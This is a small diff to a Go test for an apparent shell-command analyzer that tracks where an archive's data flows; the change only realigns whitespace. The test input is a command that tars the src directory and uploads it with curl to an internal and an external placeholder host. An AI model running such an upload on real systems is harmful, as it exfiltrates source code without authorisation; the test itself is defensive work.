@@ -783,7 +783,7 @@ func TestArchiveLineagePreservesEachConsumer(t *testing.T) {
 	t.Parallel()
 
 	facts := Analyze(Input{
-		Command: `tar -czf repo.tar.gz src; curl --upload-file repo.tar.gz https://internal.example/upload; curl --upload-file repo.tar.gz https://external.example/upload`,
+		Command:     `tar -czf repo.tar.gz src; curl --upload-file repo.tar.gz https://internal.example/upload; curl --upload-file repo.tar.gz https://external.example/upload`,
 		CWD:         "/tmp/work",
 		DialectHint: DialectPOSIX,
 	})
